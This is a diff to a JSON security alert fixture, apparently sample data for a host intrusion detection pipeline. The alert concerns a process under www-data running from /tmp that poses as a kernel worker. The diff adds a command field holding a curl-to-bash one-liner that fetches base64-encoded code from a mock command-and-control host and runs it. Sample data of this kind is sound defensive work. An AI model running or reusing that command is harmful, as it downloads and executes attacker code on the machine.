@@ -16,11 +16,16 @@
   "data": {
     "audit": {
       "exe": "/tmp/.cache/kworkerd",
-      "command": "kworkerd",
+      "command": "curl -s http://vigix-mock-c2.net/x | base64 -d | bash",
       "ppid": "1",
+      "parent": "tail",
       "uid": "33",
+      "user": "www-data",
       "auid": "0"
     },
+    "command": "curl -s http://vigix-mock-c2.net/x | base64 -d | bash",
+    "file": "/tmp/.cache/kworkerd",
+    "sha256": "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64",
     "process": "/tmp/.cache/kworkerd"
   },
   "full_log": "type=EXECVE msg=audit(1727685480.123:842): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=\"curl -s http://vigix-mock-c2.net/x | base64 -d | bash\" ; exe=\"/tmp/.cache/kworkerd\" uid=33(www-data) auid=0(root) ppid=1 — process running from a world-writable directory masquerading as a kernel worker"
